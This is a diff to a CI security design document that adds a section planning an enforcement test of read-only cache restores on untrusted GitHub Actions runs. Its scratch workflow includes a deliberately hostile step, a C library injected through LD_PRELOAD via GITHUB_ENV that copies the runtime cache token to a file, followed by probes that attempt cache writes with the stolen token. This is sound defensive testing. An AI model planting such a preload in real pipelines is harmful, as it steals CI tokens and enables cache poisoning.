@@ -1,8 +1,9 @@
 # Design: read-only cache restore on `untrusted` runs
 
-Status: **design, plus Stage 1's policy half implemented (this pull request: P1 to P3, P7, P8, the
-staged cache-mode rules, their fixtures and mutations). No workflow carries `cache-mode` yet, and no
-untrusted restore exists.** Implementation needs (1) an independent adversarial security review and (2) the
+Status: **design; Stage 1 is merged. Stage 2 (this pull request) adds the four reviewed read-only
+untrusted restores to `linux-validation-concern.yml` (rust-db only), behind a caller flag
+(`untrusted_readonly_cache`) that stays `false` until the dispatch-path enforcement spike of
+section 7c is recorded green in this file. With the flag false no untrusted restore runs.** Implementation needs (1) an independent adversarial security review and (2) the
 owner's explicit sign-off, because it changes a stated security rule (see
 [section 9](#9-rules-that-change-and-the-owners-approval)).
 
@@ -530,6 +531,232 @@ Final runs: `38746264008` (verdicts), `38746489504` (shadowing), `38746690385` (
 - Residual wording to keep honest: the cache service's refusal of a direct write under `read` is
   an `ok=false` answer plus a token with no write scope, not an HTTP error code, so the audit
   and the policy must not depend on the response shape.
+
+### 7c. Stage 2 enforcement spike (dispatch path, the real shape)
+
+Section 7a-result proved the platform claims on a `push` trigger with a flat job. Stage 2 relies on the
+shape it will actually have, which has not been proved: a `workflow_dispatch` run, a **matrix** of caller
+jobs with `permissions: contents: read` and `cache-mode: read` that call a **reusable workflow** whose
+job enters an **environment** and receives a **passed secret**, the cache token reachable by **hostile
+code that ran earlier in the job** (through `LD_PRELOAD` set in `GITHUB_ENV`), and both cache service
+protocols (the legacy v1 REST service and the v2 Twirp service). Until the result is recorded, the Stage 2
+flag stays `false`, and the policy refuses `true` unless the record is already merged on the base (see the
+gate below).
+
+Why the production restores cannot all come first. The two sources restores (and their verifiers) now run
+directly after the shared composites and the suite-contract step, before the toolchain, the Node install
+and the vendored-source fetch. The compiled-dependency restore cannot: its key contains `rustc -vV`, the
+lockfile and manifest hashes and the cargo environment, so the locate step needs the installed toolchain.
+The policy therefore allows exactly these steps ahead of an untrusted restore: the shared composites,
+`rust-toolchain`, the `rust-target-cache` locate and restored modes, the verifiers, other restores, and the
+`suite-contract` and Cargo-home steps (control-plane scripts that read the source as data; the policy pins
+their whole bodies, shell, working directory and environment, so an id alone admits nothing). The vendored
+fetch (`scripts/vendor-openvpn3.sh`, a source script) and the Node install (`npm ci`) run after every
+restore. `rust-toolchain` accepts a source `rust-toolchain.toml` or `rust-toolchain` only when every line is a
+plain form (the `[toolchain]` header, `channel` and `profile` strings, `components` and `targets` string
+arrays, comments; or, for the legacy file, one channel name). Any other key or spelling, `path` quoted,
+dotted or in an inline table included, is refused, so `rustc` cannot be a source-controlled binary when
+locate runs it. Only the files in the checkout root are read, which is where rustup resolves from. Two consequences are accepted and recorded: the sources key now hashes the
+lock files before the vendored fetch (a fetched vendored crate that ships its own Cargo.lock is no longer
+in the key, and its archives are re-downloaded because the re-hash does not find them in a lock), and the
+key schema is unchanged.
+
+Not pinned, by decision: the composites in the pre-restore set (`sanitize`, `concern-report`,
+`shell-artefact`, `rust-toolchain`, `rust-target-cache`, `verify-cargo-cache`; `drop-root-order.rb`,
+`PRE_RESTORE_COMPOSITES`) are admitted by name only, and their `action.yml` content is not pinned
+(pinning a hash of each would break on every unrelated edit and on the sibling cache PRs). Any change to
+one of them must therefore be reviewed for source-controlled execution before the untrusted restore:
+none may run a project script, read a source file as code, or honour an environment value the source can
+set. This is a review duty, not a mechanical guard.
+
+Scratch workflow, **no private source**, on a throwaway branch `cache-mode-spike-2` (never merged,
+deleted afterwards), two files. It needs a throwaway repository secret and environment, both removed
+afterwards. Pin `actions/github-script` to the SHA in `.github/policy/action-allowlist.rb`.
+
+`.github/workflows/spike2.yml`
+
+```yaml
+name: cache-mode spike 2
+on:
+  workflow_dispatch:
+    inputs:
+      halves:
+        description: both (write twin, then read half) or read-only
+        required: true
+        default: both
+        type: choice
+        options: [both, read-only]
+permissions: {}
+cache-mode: none
+jobs:
+  plan:
+    runs-on: ubuntu-24.04
+    cache-mode: none
+    outputs:
+      matrix: ${{ steps.m.outputs.matrix }}
+    steps:
+      - id: m
+        run: echo 'matrix={"include":[{"concern":"a"},{"concern":"b"}]}' >> "${GITHUB_OUTPUT}"
+  write-twin:
+    if: ${{ inputs.halves == 'both' }}
+    needs: plan
+    permissions:
+      contents: read
+    cache-mode: write
+    strategy:
+      fail-fast: false
+      matrix: ${{ fromJSON(needs.plan.outputs.matrix) }}
+    uses: ./.github/workflows/spike2-called.yml
+    secrets:
+      DUMMY: ${{ secrets.SPIKE_DUMMY }}
+    with:
+      mode: write
+      concern: ${{ matrix.concern }}
+  read-half:
+    if: ${{ !failure() && !cancelled() }}
+    needs: [plan, write-twin]
+    permissions:
+      contents: read
+    cache-mode: read
+    strategy:
+      fail-fast: false
+      matrix: ${{ fromJSON(needs.plan.outputs.matrix) }}
+    uses: ./.github/workflows/spike2-called.yml
+    secrets:
+      DUMMY: ${{ secrets.SPIKE_DUMMY }}
+    with:
+      mode: read
+      concern: ${{ matrix.concern }}
+```
+
+`.github/workflows/spike2-called.yml`
+
+```yaml
+name: cache-mode spike 2 called
+on:
+  workflow_call:
+    inputs:
+      mode: { required: true, type: string }
+      concern: { required: true, type: string }
+    secrets:
+      DUMMY: { required: false }
+permissions: {}
+jobs:
+  probe:
+    environment: spike-env
+    runs-on: ubuntu-24.04
+    name: probe ${{ inputs.mode }} ${{ inputs.concern }}
+    steps:
+      # Hostile code that runs BEFORE the restore: a preloaded library that copies the cache token out of
+      # any process that has it (the node process of every later action) into a file, set through the
+      # environment file exactly as source-controlled code could.
+      - name: Hostile pre-restore step (LD_PRELOAD through GITHUB_ENV)
+        run: |
+          set -euo pipefail
+          mkdir -p "${RUNNER_TEMP}/hostile"
+          cat > "${RUNNER_TEMP}/hostile/h.c" <<'EOF'
+          #include <stdio.h>
+          #include <stdlib.h>
+          #include <string.h>
+          __attribute__((constructor)) static void h(void) {
+            const char *t = getenv("ACTIONS_RUNTIME_TOKEN");
+            if (!t || !*t) return;
+            const char *dir = getenv("HOSTILE_DIR");
+            if (!dir) return;
+            char path[512]; snprintf(path, sizeof path, "%s/stolen.txt", dir);
+            FILE *f = fopen(path, "w"); if (!f) return;
+            fprintf(f, "%s\n%s\n%s\n", t, getenv("ACTIONS_RESULTS_URL") ? getenv("ACTIONS_RESULTS_URL") : "", getenv("ACTIONS_CACHE_URL") ? getenv("ACTIONS_CACHE_URL") : "");
+            fclose(f);
+          }
+          EOF
+          gcc -shared -fPIC -o "${RUNNER_TEMP}/hostile/h.so" "${RUNNER_TEMP}/hostile/h.c"
+          { echo "HOSTILE_DIR=${RUNNER_TEMP}/hostile"; echo "LD_PRELOAD=${RUNNER_TEMP}/hostile/h.so"; } >> "${GITHUB_ENV}"
+          echo "DUMMY secret present: ${{ secrets.DUMMY != '' }}"
+      - name: Seed a harmless file
+        run: mkdir -p "${RUNNER_TEMP}/seed" && echo spike > "${RUNNER_TEMP}/seed/f"
+      - name: Restore the seeded entry (must hit in run 2 of the branch that wrote it)
+        id: r
+        uses: actions/cache/restore@55cc8345863c7cc4c66a329aec7e433d2d1c52a9 # v6.1.0
+        with:
+          path: ${{ runner.temp }}/seed
+          key: spike2-seed-${{ github.ref_name }}-${{ inputs.concern }}
+      - name: Probe both cache protocols with the runtime token (and the stolen copy)
+        uses: actions/github-script@<the allow-listed pin>
+        with:
+          script: |
+            const fs = require('fs');
+            const own = process.env.ACTIONS_RUNTIME_TOKEN;
+            let stolen = '';
+            try { stolen = fs.readFileSync(`${process.env.RUNNER_TEMP}/hostile/stolen.txt`, 'utf8').split('\n')[0]; } catch (e) {}
+            core.info(`probe mode=${{ inputs.mode }} concern=${{ inputs.concern }} ACTIONS_CACHE_MODE=${process.env.ACTIONS_CACHE_MODE} own-token=${own ? 'present' : 'ABSENT'} stolen-token=${stolen ? 'captured' : 'NOT captured'}`);
+            core.info(`ac claim=${JSON.stringify(JSON.parse(Buffer.from(own.split('.')[1], 'base64url').toString()).ac)}`);
+            for (const [label, token] of [['own', own], ['stolen', stolen]]) {
+              if (!token) continue;
+              const key = `spike2-direct-${{ inputs.mode }}-${{ inputs.concern }}-${label}-${Date.now()}`;
+              const v2 = await fetch(`${process.env.ACTIONS_RESULTS_URL}twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry`, { method: 'POST', headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` }, body: JSON.stringify({ key, version: 'v1' }) });
+              core.info(`v2 ${label} reservation http=${v2.status} body=${await v2.text()}`);
+              const v1 = await fetch(`${process.env.ACTIONS_CACHE_URL}_apis/artifactcache/caches`, { method: 'POST', headers: { 'Content-Type': 'application/json', Accept: 'application/json;api-version=6.0-preview.1', Authorization: `Bearer ${token}` }, body: JSON.stringify({ key: key + '-v1', version: 'v1' }) });
+              core.info(`v1 ${label} reservation http=${v1.status} body=${await v1.text()}`);
+            }
+      - name: Save the seed (write half only, on a miss)
+        if: ${{ inputs.mode == 'write' && steps.r.outputs.cache-hit != 'true' }}
+        uses: actions/cache/save@55cc8345863c7cc4c66a329aec7e433d2d1c52a9 # v6.1.0
+        with:
+          path: ${{ runner.temp }}/seed
+          key: spike2-seed-${{ github.ref_name }}-${{ inputs.concern }}
+      - name: Attempt a save under the granted mode (must create nothing under read)
+        uses: actions/cache/save@55cc8345863c7cc4c66a329aec7e433d2d1c52a9 # v6.1.0
+        with:
+          path: ${{ runner.temp }}/seed
+          key: spike2-save-attempt-${{ inputs.mode }}-${{ inputs.concern }}-${{ github.run_id }}-${{ github.run_attempt }}
+```
+
+Setup, run and clean up (the coordinator runs these; the lane never dispatches):
+
+```
+R=Moh-Bakr/Taurine-CI
+# 0. check https://www.githubstatus.com/api/v2/incidents/unresolved.json first
+git switch -c cache-mode-spike-2 origin/main
+# add the two files above, commit, then:
+git push origin cache-mode-spike-2
+git push origin cache-mode-spike-2:cache-mode-spike-2b          # a second ref, same files
+gh secret set SPIKE_DUMMY --body spike-dummy -R $R                # a dummy value, deleted afterwards
+gh api -X PUT repos/$R/environments/spike-env                     # an environment with no secrets or rules
+# 1. seed and read from the same branch, twice (the second run must hit):
+gh workflow run spike2.yml -R $R --ref cache-mode-spike-2 -f halves=both
+gh workflow run spike2.yml -R $R --ref cache-mode-spike-2 -f halves=both
+# 2. read-half only, from a different ref than the seed writer (it cannot see the seed; it must still write nothing):
+gh workflow run spike2.yml -R $R --ref cache-mode-spike-2b -f halves=read-only
+# 3. after each run ends, read the job logs once, then list what each ref holds:
+gh cache list -R $R --ref refs/heads/cache-mode-spike-2  --json key,ref,createdAt
+gh cache list -R $R --ref refs/heads/cache-mode-spike-2b --json key,ref,createdAt
+# 4. clean up:
+gh cache delete --all --ref refs/heads/cache-mode-spike-2 -R $R; gh cache delete --all --ref refs/heads/cache-mode-spike-2b -R $R
+git push origin :cache-mode-spike-2 :cache-mode-spike-2b; gh secret delete SPIKE_DUMMY -R $R; gh api -X DELETE repos/$R/environments/spike-env
+```
+
+Green means all of the following, read from the logs and the cache lists:
+
+1. In every `read` probe: `ACTIONS_CACHE_MODE=read`, own token present, and the `ac` claim carries no write scope for the own ref; in every `write` probe the claim does.
+2. In every `read` probe the v2 reservation reports `ok:false` and the v1 `POST /_apis/artifactcache/caches` is refused (a non-2xx status, or a body that reserves nothing), for the own token and for the token captured by the hostile `LD_PRELOAD` (the capture must show `stolen-token=captured`, otherwise the hostile step proves nothing and the run is not green).
+3. In every `write` probe the same reservations succeed (so the test can fail).
+4. The read half's `actions/cache/save` under `read` creates nothing: after the runs, `gh cache list --ref refs/heads/cache-mode-spike-2` shows the seed keys and the `spike2-save-attempt-write-*` keys and **no** `spike2-save-attempt-read-*` key, and the listing for `cache-mode-spike-2b` is empty.
+5. In run 2 on `cache-mode-spike-2`, the read half's restore reports `cache-hit: true` for its seed key (a restore through the reusable workflow, under the matrix, the environment and the passed secret).
+6. In the run on `cache-mode-spike-2b` (a different ref than the seed writer) the restore misses, the reservations are refused, and nothing is created.
+
+Any other result keeps the flag `false`. The record is merged **before** the flip:
+
+1. Pull request A adds this exact line to this file, on its own line, with the run ids and the reviewer, and nothing else that affects the flag: `Stage 2 enforcement spike result: GREEN run <run id> reviewed by <name> on <YYYY-MM-DD>`. It merges.
+2. Pull request B, opened after A has merged, sets `untrusted_readonly_cache: true` on `validate-untrusted` in `linux-validation.yml` and changes neither the record nor the policy. The policy (`check-cache-mode.rb`, `spike_gate`) refuses the flip unless the record is already on the base side, which the base-policy pass reads from the base checkout at `RUNNER_TEMP/base-policy`, and refuses it if the same diff adds or alters the record. Because the checker that judges B is main's, B cannot weaken the gate.
+
+Also before the flip: the owner runs `gh cache delete --all --ref refs/heads/untrusted` (section 3.3), and a
+protected `main` run of `rust-db` has saved the week's key. `.github/CODEOWNERS` names the owner for the
+workflows, composites, policy and this file; it takes effect only when "Require review from Code Owners"
+is on in the `main` branch protection, an owner action in the repository settings; until then it names
+owners but binds nobody. Only the base-policy pass gates the record: it is the one run whose checker comes
+from `main` and reads the record from the base checkout, so a pull request's own pass is never the gate and
+the gate cannot be weakened by the pull request it judges. The flip is therefore not protected by a green
+own-policy run alone, and the record's reviewer line is an assertion a person made, not a machine proof.
 
 ### 7b. Gain on one concern (`rust-db`), only after Stage 1 is merged and reviewed
 
